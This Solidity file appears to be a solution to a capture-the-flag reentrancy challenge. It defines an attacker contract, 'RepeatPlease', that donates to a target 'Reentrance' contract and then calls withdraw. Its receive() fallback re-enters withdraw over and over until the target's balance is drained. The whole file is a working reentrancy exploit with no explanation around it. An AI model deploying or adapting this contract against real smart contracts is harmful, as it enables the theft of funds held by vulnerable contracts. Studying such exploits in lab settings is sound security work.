// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface Reentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract RepeatPlease {
    address public owner;
    Reentrance public original;
    uint256 public amount = 9003000000000000001;

    constructor(address payable _to) public {
        owner = msg.sender;
        original = Reentrance(_to);
    }

    function give_money() public payable {
        /*Just money*/
    }

    function donate() public {
        original.donate{value: amount, gas: 400000}(address(this));
        original.withdraw(amount);
    }

    function balance() public view returns (uint256 balanceee) {
        return address(original).balance;
    }

    receive() external payable {
        if (address(original).balance != 0) {
            original.withdraw(amount);
        }
    }
}
